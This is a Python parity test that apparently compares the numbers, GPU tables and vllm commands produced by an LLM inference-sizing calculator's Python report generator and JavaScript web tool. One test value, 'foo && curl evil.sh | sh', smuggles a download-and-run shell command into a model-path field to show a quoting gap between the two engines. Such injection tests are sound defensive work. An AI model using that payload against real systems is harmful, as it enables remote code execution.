#!/usr/bin/env python3
"""Verify the PDF generator and the web tool compute the same numbers.

index.html and generate_report.py implement the same model twice, in two
languages. That duplication is deliberate (the web tool has no backend, the
report generator has no browser) but it silently drifted once already: the
throughput and dtype bugs lived in both copies, and fixing one would have left
the PDF — which the README calls procurement-ready — quietly wrong.

Extracts compute() from generate_report.py without importing reportlab, runs
computeInference() from index.html under node, and compares field by field.
Also extracts build_vllm_cmd()/buildVllmCommand() — the emitted vllm command
is a second code path in both engines, not covered by the compute() diff
above, and it drifted the same way: above 8 GPUs, index.html split into
TP/DP while generate_report.py kept emitting `--tensor-parallel-size` sized
to the full GPU count with no DP flag at all.

Run:  python3 tests/parity.test.py
"""
import ast
import json
import os
import re
import subprocess
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# ---- load the Python model without pulling in reportlab -------------------
src = open(os.path.join(ROOT, "generate_report.py")).read()
tree = ast.parse(src)
# Every module-level name compute() closes over must be listed here, and must be
# a plain assignment — an annotated one (PERF: dict = {...}) parses as AnnAssign,
# gets skipped, and surfaces as a bare NameError from inside compute() much later.
wanted = {"GIB", "GPUS", "PERF"}
# build_vllm_cmd/split_parallelism don't close over any of the above (they take
# cfg/comp as plain dicts and gpu_count as a plain int), so wanted stays as-is —
# they just need to ride along in the same exec() so build_vllm_cmd can call
# split_parallelism, plus shlex in ns below since build_vllm_cmd shells out to it.
wanted_fns = {"compute", "build_vllm_cmd", "split_parallelism"}
nodes = [
    n for n in tree.body
    if (isinstance(n, ast.FunctionDef) and n.name in wanted_fns)
    or (isinstance(n, ast.Assign)
        and any(getattr(t, "id", None) in wanted for t in n.targets))
]
for name in sorted(wanted_fns):
    assert any(isinstance(n, ast.FunctionDef) and n.name == name for n in nodes), f"{name}() not found"
ns = {"math": __import__("math"), "shlex": __import__("shlex")}
exec(compile(ast.Module(body=nodes, type_ignores=[]), "<gr>", "exec"), ns)
for name in sorted(wanted):
    assert name in ns, f"{name} not extracted from generate_report.py — is it still a top-level assignment?"
compute, GPUS, PERF = ns["compute"], ns["GPUS"], ns["PERF"]
build_vllm_cmd = ns["build_vllm_cmd"]

# ---- run the JS model on the same inputs ----------------------------------
CASES = [
    {"name": "8B bf16, 1 user, H100",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 8192, "conc": 1, "n_gpu": 1, "gpu": "h100-80"},
    {"name": "8B bf16, 64 users, H100",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 8192, "conc": 64, "n_gpu": 1, "gpu": "h100-80"},
    # Every other case is bandwidth-bound, which leaves the decode MFU unexercised:
    # it only enters the maths through the compute ceiling, and a ceiling that never
    # binds can drift between the two engines unnoticed. This case sits on it.
    {"name": "8B bf16 on A100 80, compute-bound at high batch (pins decode MFU)",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 1024, "conc": 256, "n_gpu": 1, "gpu": "a100-80"},
    {"name": "70B awq, 4x A100 80",
     "params": 70, "active": 100, "bpp": 0.5, "layers": 80, "kv_heads": 8, "h_dim": 128,
     "ctx": 16384, "conc": 32, "n_gpu": 4, "gpu": "a100-80"},
    {"name": "70B awq, 8x A100 80, PCIe (penalty scales with count)",
     "params": 70, "active": 100, "bpp": 0.5, "layers": 80, "kv_heads": 8, "h_dim": 128,
     "ctx": 16384, "conc": 32, "n_gpu": 8, "gpu": "a100-80", "nvlink": False},
    {"name": "26B MoE fp8, B200, fp8 KV",
     "params": 26, "active": 15, "bpp": 1, "layers": 48, "kv_heads": 8, "h_dim": 128,
     "ctx": 32768, "conc": 128, "n_gpu": 1, "gpu": "b200-192", "kv_bpp": 1},
    {"name": "7B bf16, 2x RTX 4090, no NVLink",
     "params": 7, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 4096, "conc": 8, "n_gpu": 2, "gpu": "rtx4090-24", "nvlink": False},
    {"name": "Gemma 4 26B SWA, long context, H100",
     "params": 26, "active": 15, "bpp": 2, "layers": 30, "kv_heads": 8, "h_dim": 256,
     "ctx": 131072, "conc": 4, "n_gpu": 1, "gpu": "h100-80",
     "attn": "swa", "swa_win": 1024, "swa_local": 25},
    {"name": "Gemma 4 26B SWA, below the window",
     "params": 26, "active": 15, "bpp": 2, "layers": 30, "kv_heads": 8, "h_dim": 256,
     "ctx": 512, "conc": 16, "n_gpu": 1, "gpu": "h100-80",
     "attn": "swa", "swa_win": 1024, "swa_local": 25},
    {"name": "DeepSeek V3 MLA, fp8, 16x H100",
     "params": 671, "active": 5, "shared_exp": 1, "bpp": 1, "layers": 61,
     "kv_heads": 128, "h_dim": 56, "ctx": 16384, "conc": 8, "n_gpu": 16,
     "gpu": "h100-80", "attn": "mla", "mla_dim": 576},
    {"name": "70B bf16 on H200 141GB (new GPU entry)",
     "params": 70, "active": 100, "bpp": 2, "layers": 80, "kv_heads": 8, "h_dim": 128,
     "ctx": 32768, "conc": 16, "n_gpu": 2, "gpu": "h200-141"},
    {"name": "8B bf16 on RTX 5090 (new GPU entry)",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 8192, "conc": 4, "n_gpu": 1, "gpu": "rtx5090-32"},
    {"name": "27B on L4 24GB, does not fit (new GPU entry)",
     "params": 27, "active": 100, "bpp": 0.5, "layers": 48, "kv_heads": 8, "h_dim": 128,
     "ctx": 4096, "conc": 1, "n_gpu": 1, "gpu": "l4-24"},
    {"name": "Agent stack: 8K shared prefix, 64 users, prefix caching on",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 32768, "conc": 64, "n_gpu": 1, "gpu": "h100-80",
     "shared_prefix": 8192, "prefix_caching": True},
    {"name": "Same agent stack with prefix caching disabled",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 32768, "conc": 64, "n_gpu": 1, "gpu": "h100-80",
     "shared_prefix": 8192, "prefix_caching": False},
    {"name": "Gemma SWA with shared prefix — only global layers share",
     "params": 26, "active": 15, "bpp": 2, "layers": 30, "kv_heads": 8, "h_dim": 256,
     "ctx": 32768, "conc": 32, "n_gpu": 1, "gpu": "h100-80",
     "attn": "swa", "swa_win": 1024, "swa_local": 25,
     "shared_prefix": 4096, "prefix_caching": True},
]

js_runner = r"""
const fs=require('fs');
const html=fs.readFileSync(process.argv[1],'utf8');
const gib=html.match(/^const GIB = .+;$/m)[0];
const perf=html.match(/^const PERF = \{[\s\S]*?\n\};$/m)[0];
const s=html.indexOf('function computeInference(state) {'), e=html.indexOf('\n}\n',s);
const ci=new Function(`${gib}\n${perf}\n${html.slice(s,e+2)}; return computeInference;`)();
const gt=html.match(/^const GPU_TABLE = \{[\s\S]*?\n\};$/m);
if(!gt) throw new Error('GPU_TABLE not found in index.html');
const GPU_TABLE=new Function(`${gt[0]}; return GPU_TABLE;`)();
const G={};
for(const g of Object.values(GPU_TABLE)){
  G[g.name.replace(/ GB$/,'GB')]={gb:g.gb,bw:g.bw,h:g.hyper,sp:g.spec,st:g.spot,tf:g.tflops};
}
const out=JSON.parse(process.argv[2]).map(c=>{
  const g=G[c.gpuName];
  return ci({params:c.params,activePercent:c.active,bytesPerParam:c.bpp,layers:c.layers,
    kvHeads:c.kv_heads,headDim:c.h_dim,sharedExperts:c.shared_exp||0,contextLength:c.ctx,
    concurrency:c.conc,gpuCount:c.n_gpu,hasNVLink:c.nvlink!==false,kvBytesPerValue:c.kv_bpp||2,
    gpuGB:g.gb,gpuBandwidth:g.bw,gpuTFLOPS:g.tf,gpuHyperCost:g.h,gpuSpecCost:g.sp,
    gpuSpotCost:g.st,gpuName:c.gpuName,
    attnMode:c.attn||'standard',swaWindow:c.swa_win||0,
    swaLocalLayers:c.swa_local||0,mlaLatentDim:c.mla_dim||0,
    modelMaxCtx:c.max_ctx||1048576,
    sharedPrefix:c.shared_prefix||0,prefixCaching:c.prefix_caching!==false});
});
console.log(JSON.stringify(out));
"""

# Derived from the table both engines are generated from, not hand-maintained.
# getGpuSpec() in index.html strips the space out of "H100 80 GB" before handing
# the name to computeInference(); mirror that so the JS runner keys match.
def display_name(slug):
    return GPUS[slug]["name"].replace(" GB", "GB")

js_in = [dict(c, gpuName=display_name(c["gpu"]), max_ctx=c.get("max_ctx", 1048576)) for c in CASES]
proc = subprocess.run(
    ["node", "-e", js_runner, os.path.join(ROOT, "index.html"), json.dumps(js_in)],
    capture_output=True, text=True)
if proc.returncode:
    print("node runner failed:\n" + proc.stderr)
    sys.exit(1)
js_results = json.loads(proc.stdout)

# ---- compare --------------------------------------------------------------
FIELDS = [
    ("weights_gb", "weightsGB", 0.01), ("kv_gb", "kvCacheGB", 0.01),
    ("act_gb", "activationsGB", 0.01), ("total_gb", "totalGB", 0.01),
    ("per_total", "perGPU.total", 0.01), ("free_kv", "freeForKVCache", 0.01),
    ("max_ctx_1", "maxContextSingleUser", 1), ("max_conc_8k", "maxConcurrentAt8K", 1),
    ("single_tok", "singleStreamTokS", 1), ("agg_tok", "aggregateTokS", 1),
    ("agg_obs_lo", "aggregateObservedLoTokS", 1), ("agg_obs_hi", "aggregateObservedHiTokS", 1),
    ("per_user_load", "perUserAtLoadTokS", 1), ("eff_batch", "effectiveBatch", 0),
    ("max_batch_kv", "maxBatchByKV", 0), ("ttft_ms", "ttftMs", 1),
    ("sat_batch", "saturatedBatch", 0), ("sat_tok", "saturatedTokS", 1),
    ("ttft_cold_ms", "ttftColdMs", 1), ("ttft_warm_ms", "ttftWarmMs", 1),
    ("kv_saved_by_prefix_gb", "kvSavedByPrefixGB", 0.01),
    # The constants as executed, not as extracted — this is what stops the two
    # engines quietly disagreeing about a value no case happens to exercise.
    ("perf_mbu", "perfMbu", 0), ("perf_mfu_decode", "perfMfuDecode", 0),
    ("perf_mfu_prefill", "perfMfuPrefill", 0),
    ("perf_obs_lo", "perfObsLo", 0), ("perf_obs_hi", "perfObsHi", 0),
]
dig = lambda d, p: d["perGPU"]["total"] if p == "perGPU.total" else d[p]

passed = failed = 0
for case, js in zip(CASES, js_results):
    cfg = {k: v for k, v in case.items() if k != "name"}
    cfg["gpu"] = GPUS[case["gpu"]]
    cfg.setdefault("max_ctx", 1048576)
    py = compute(cfg)
    bad = []
    for pk, jk, tol in FIELDS:
        a, b = py[pk], dig(js, jk)
        if abs(a - b) > max(tol, abs(b) * 0.001):
            bad.append(f"{pk}: py={a:.4g} js={b:.4g}")
    if bad:
        print(f"  FAIL {case['name']}")
        for m in bad:
            print(f"       {m}")
        failed += 1
    else:
        print(f"  ok   {case['name']}")
        passed += 1

# The verdict flags must agree too — that is the tool's headline answer.
for case, js in zip(CASES, js_results):
    cfg = {k: v for k, v in case.items() if k != "name"}
    cfg["gpu"] = GPUS[case["gpu"]]
    cfg.setdefault("max_ctx", 1048576)
    py = compute(cfg)
    if py["fits"] != js["fits"] or py["comfortable"] != js["comfortable"]:
        print(f"  FAIL {case['name']}: verdict differs "
              f"(py fits={py['fits']} js fits={js['fits']})")
        failed += 1
    else:
        passed += 1

# The GPU tables are maintained twice. Drift there is silent and produces
# confidently wrong numbers, so compare them field by field.
js_gpus = json.loads(subprocess.run(
    ["node", "-e", """
const fs=require('fs');const h=fs.readFileSync(process.argv[1],'utf8');
const gt=h.match(/^const GPU_TABLE = \\{[\\s\\S]*?\\n\\};$/m);
if(!gt) throw new Error('GPU_TABLE not found in index.html');
console.log(JSON.stringify(new Function(`${gt[0]}; return GPU_TABLE;`)()));""",
     os.path.join(ROOT, "index.html")],
    capture_output=True, text=True).stdout)

# Both engines now key on the slug, so compare on that and treat `name` as an
# ordinary field. Joining on the display name (as this did while the names were
# hand-authored) made a name drift invisible — it surfaced as a card missing from
# one side rather than as the mismatch it is.
if set(GPUS) != set(js_gpus):
    only_py = sorted(set(GPUS) - set(js_gpus))
    only_js = sorted(set(js_gpus) - set(GPUS))
    print(f"  FAIL GPU tables list different cards: only-python={only_py} only-js={only_js}")
    failed += 1
else:
    drift = []
    for key in sorted(GPUS):
        for f in ("gb", "bw", "hyper", "spec", "spot", "tflops", "name"):
            a, b = GPUS[key][f], js_gpus[key][f]
            differs = (a != b) if f == "name" else (abs(a - b) > 1e-9)
            if differs:
                drift.append(f"{key}.{f}: py={a!r} js={b!r}")
    if drift:
        print("  FAIL GPU tables have drifted")
        for d in drift:
            print(f"       {d}")
        failed += 1
    else:
        print(f"  ok   GPU tables identical across both engines ({len(GPUS)} cards)")
        passed += 1

# ---- generated blocks vs the JSON they are generated from ------------------
# data/gpus.json is the contributor-facing source; both engines carry a generated
# inline copy because a browser on file:// cannot fetch a sibling JSON. Nothing
# forces anyone to re-run tools/sync_data.py, so assert it here: a failure means
# either the JSON was edited without re-running the script, or a generated block
# was hand-edited instead of the source.
gpus_json = json.load(open(os.path.join(ROOT, "data", "gpus.json")))["data"]

for label, inline in (("generate_report.py", GPUS), ("index.html", js_gpus)):
    if inline != gpus_json:
        only_src = sorted(set(gpus_json) - set(inline))
        only_gen = sorted(set(inline) - set(gpus_json))
        diffs = [f"{k}.{f}: json={gpus_json[k].get(f)!r} {label}={inline[k].get(f)!r}"
                 for k in sorted(set(gpus_json) & set(inline))
                 for f in sorted(set(gpus_json[k]) | set(inline[k]))
                 if gpus_json[k].get(f) != inline[k].get(f)]
        print(f"  FAIL {label}'s GPU_TABLE block is out of sync with data/gpus.json")
        if only_src:
            print(f"       missing from {label}: {only_src}")
        if only_gen:
            print(f"       not in the JSON: {only_gen}")
        for d in diffs[:10]:
            print(f"       {d}")
        print("       run: python3 tools/sync_data.py")
        failed += 1
    else:
        print(f"  ok   {label}'s GPU_TABLE block matches data/gpus.json")
        passed += 1

# The same guard is owed to BENCHMARK_DATA, which has had this hole since v1.0:
# tests/model.test.js substitutes benchmarks/data.json in place of the inline copy
# when testing findBenchmark(), so the suite validates the JSON while the browser
# runs the inline block, with nothing comparing them. It lands in the commit that
# fixes the drift it finds, so this one stays green on its own terms.

# ---- emitted vllm command, across a widened matrix -------------------------
# Everything above compares compute() output — VRAM, throughput, verdicts —
# but never the *command* either engine prints, which is a second code path
# in both. It silently diverged above 8 GPUs: index.html split into TP/DP,
# generate_report.py emitted `--tensor-parallel-size <n_gpu>` with no DP flag
# at all. Driven straight off the pure builders (buildVllmCommand /
# build_vllm_cmd) rather than through the full VRAM pipeline above — that
# pipeline's agreement is already covered by CASES; this section is only
# about the command string.
#
# gpu_count is crossed with prefix_caching in full (every count gets both).
# That pairing is what caught generate_report.py never reading
# prefix_caching at all — an earlier version of this matrix pinned
# prefix_caching=True, exactly the one value where the two engines happened
# to agree.
#
# A later review found that *rotating* a field is not the same as
# *exercising its effect*, and this comment previously claimed the rotation
# below closed that gap. It didn't, for three fields: fits was pinned True
# (the "does not fit" short-circuit in both engines never ran), kv_bpp was
# absent on the Python side while JS's kvBytesPerValue was hardcoded to 2
# (so --kv-cache-dtype fp8 never appeared in either output — the exact
# shape of the prefix_caching bug: a flag either engine can silently stop
# emitting), and ctx equaled max_ctx_1 (so max-model-len's min() never had
# to pick between two different operands — a min-to-max mutation would have
# survived). is_moe also never paired with n_gpu == 1, so the n_gpu > 1
# guard on --enable-expert-parallel went untested at the one count where
# dropping it would matter. An overclaiming comment is worse than none,
# because it tells the next reader not to look — so: fits, kv_bpp and ctx
# (deliberately != max_ctx_1) are varied below, and EXTRA_CASES adds the
# is_moe/n_gpu=1 pair plus two fits=False cases explicitly, rather than
# crossing fits into the main grid where it would mostly just suppress
# every other axis it landed on.
#
# quant and is_moe are indexed by g = i // 2 (which GPU_COUNTS entry this
# is), not by i itself, so they vary independently of prefix_caching
# (i % 2) instead of moving in lockstep with it — quant used to (i % 4),
# which meant only 4 of the 8 (quant, prefix_caching) pairs ever occurred.
GPU_COUNTS = [1, 2, 3, 6, 8, 12, 16, 17, 64, 100, 128, 256]
PREFIX_CACHING_VALUES = [True, False]
QUANT_VALUES = [None, "awq", "gptq", "gguf"]
IS_MOE_VALUES = [False, True]
KV_BPP_VALUES = [2, 1]  # BF16 vs FP8 KV cache -> --kv-cache-dtype fp8
MAX_CTX_1 = 8192
CTX_VALUES = [4096, 16384]  # one below MAX_CTX_1, one above — never equal to it
# Benign but not a single constant either — rotated below. All shlex-safe
# (word chars plus @%+=:,./-) so none of these brush up against the
# shell-quoting asymmetry, which is handled separately by UNSAFE_HF_MODELS.
HF_MODEL_VALUES = [
    "/opt/models/YourModel",
    "meta-llama/Llama-3.1-8B-Instruct",
    "/mnt/nfs/models/team-a/checkpoint_v2.1",
]
# generate_report.py shell-quotes hf_model via shlex.quote() (see the
# injection tests in report.test.py); index.html's buildVllmCommand() never
# quotes anything, because the string it builds is only ever pasted back by
# the same person who typed it into their own browser tab, not exec'd from a
# shared file. The two engines are SUPPOSED to disagree on a value like this
# today — that is a real gap, just not a TP/DP one, and out of scope here.
# Naming and skipping it keeps that gap visible instead of it simply never
# being tried.
UNSAFE_HF_MODELS = ["foo && curl evil.sh | sh"]

MATRIX = []
i = 0
for n in GPU_COUNTS:
    for pc in PREFIX_CACHING_VALUES:
        g = i // 2
        MATRIX.append({
            "n_gpu": n, "prefix_caching": pc, "fits": True,
            "quant": QUANT_VALUES[g % len(QUANT_VALUES)],
            "is_moe": IS_MOE_VALUES[(g // 4) % len(IS_MOE_VALUES)],
            "kv_bpp": KV_BPP_VALUES[(g // 2) % len(KV_BPP_VALUES)],
            "ctx": CTX_VALUES[g % len(CTX_VALUES)],
            "hf_model": HF_MODEL_VALUES[g % len(HF_MODEL_VALUES)],
            "skip_reason": None,
        })
        i += 1

EXTRA_CASES = [
    # is_moe=True paired with n_gpu=1: the grid above never produces this —
    # is_moe only turns True once g >= 4, i.e. n_gpu >= 8 — so on its own it
    # never tests the n_gpu > 1 / gpuCount > 1 guard on
    # --enable-expert-parallel at the one count where dropping that guard
    # would actually change the output (elsewhere, is_moe=True only ever
    # co-occurs with n_gpu > 1 anyway, so the guard is a no-op there).
    {"n_gpu": 1, "prefix_caching": True, "fits": True, "quant": None,
     "is_moe": True, "kv_bpp": 2, "ctx": 8192,
     "hf_model": "/opt/models/YourModel", "skip_reason": None},
    # fits=False short-circuits both engines to the same constant string
    # before n_gpu/quant/kv_bpp/ctx are ever read, so crossing it into the
    # main grid would mostly waste those axes on a state where they don't
    # show up. Two dedicated cases (different gpu_count/prefix_caching, so
    # this isn't just one data point) are enough to catch either engine's
    # message drifting from the other's.
    {"n_gpu": 4, "prefix_caching": True, "fits": False, "quant": None,
     "is_moe": False, "kv_bpp": 2, "ctx": 8192,
     "hf_model": "/opt/models/YourModel", "skip_reason": None},
    {"n_gpu": 12, "prefix_caching": False, "fits": False, "quant": "awq",
     "is_moe": True, "kv_bpp": 1, "ctx": 4096,
     "hf_model": "meta-llama/Llama-3.1-8B-Instruct", "skip_reason": None},
]
MATRIX.extend(EXTRA_CASES)

for unsafe in UNSAFE_HF_MODELS:
    MATRIX.append({
        "n_gpu": 1, "prefix_caching": True, "fits": True, "quant": None,
        "is_moe": False, "kv_bpp": 2, "ctx": 8192, "hf_model": unsafe,
        "skip_reason": "known shell-quoting asymmetry (py quotes via shlex, js does not) — tracked separately, not TP/DP",
    })

py_cmds = [
    build_vllm_cmd(
        {"hf_model": m["hf_model"], "ctx": m["ctx"], "n_gpu": m["n_gpu"],
         "quant": m["quant"], "prefix_caching": m["prefix_caching"],
         "kv_bpp": m["kv_bpp"]},
        {"fits": m["fits"], "is_moe": m["is_moe"], "max_ctx_1": MAX_CTX_1},
    )
    for m in MATRIX
]

js_cmd_runner = r"""
const fs = require('fs');
const html = fs.readFileSync(process.argv[1], 'utf8');
function extract(sig) {
  const s = html.indexOf(sig);
  if (s === -1) throw new Error('not found in index.html: ' + sig);
  const e = html.indexOf('\n}\n', s);
  return html.slice(s, e + 2);
}
const src = extract('function splitParallelism(gpuCount) {')
          + extract('function buildVllmCommand(state, computed, modelPath) {');
const buildVllmCommand = new Function(`${src}; return buildVllmCommand;`)();
const scenarios = JSON.parse(process.argv[2]);
const MAX_CTX_1 = 8192; // must match Python's MAX_CTX_1 above
console.log(JSON.stringify(scenarios.map((m) => buildVllmCommand(
  {gpuCount: m.n_gpu, quantMethod: m.quant || '', kvBytesPerValue: m.kv_bpp,
   prefixCaching: m.prefix_caching, contextLength: m.ctx},
  {fits: m.fits, isMoE: m.is_moe, maxContextSingleUser: MAX_CTX_1},
  m.hf_model))));
"""
proc = subprocess.run(
    ["node", "-e", js_cmd_runner, os.path.join(ROOT, "index.html"), json.dumps(MATRIX)],
    capture_output=True, text=True)
if proc.returncode:
    print("  FAIL node command runner failed:\n" + proc.stderr)
    failed += 1
else:
    js_cmds = json.loads(proc.stdout)
    for m, py_cmd, js_cmd in zip(MATRIX, py_cmds, js_cmds):
        label = (f"n_gpu={m['n_gpu']} prefix_caching={m['prefix_caching']} fits={m['fits']} "
                 f"quant={m['quant']!r} is_moe={m['is_moe']} kv_bpp={m['kv_bpp']} ctx={m['ctx']} "
                 f"hf_model={m['hf_model']!r}")
        if m["skip_reason"]:
            print(f"  skip {label}")
            print(f"       reason: {m['skip_reason']}")
            if py_cmd != js_cmd:
                print(f"       (confirmed still diverges — py: {py_cmd!r} js: {js_cmd!r})")
            continue
        if py_cmd != js_cmd:
            print(f"  FAIL emitted vllm command differs ({label})")
            print(f"       py: {py_cmd!r}")
            print(f"       js: {js_cmd!r}")
            failed += 1
        else:
            print(f"  ok   emitted vllm command matches ({label})")
            passed += 1

print(f"\n{passed} passed, {failed} failed\n")
sys.exit(1 if failed else 0)
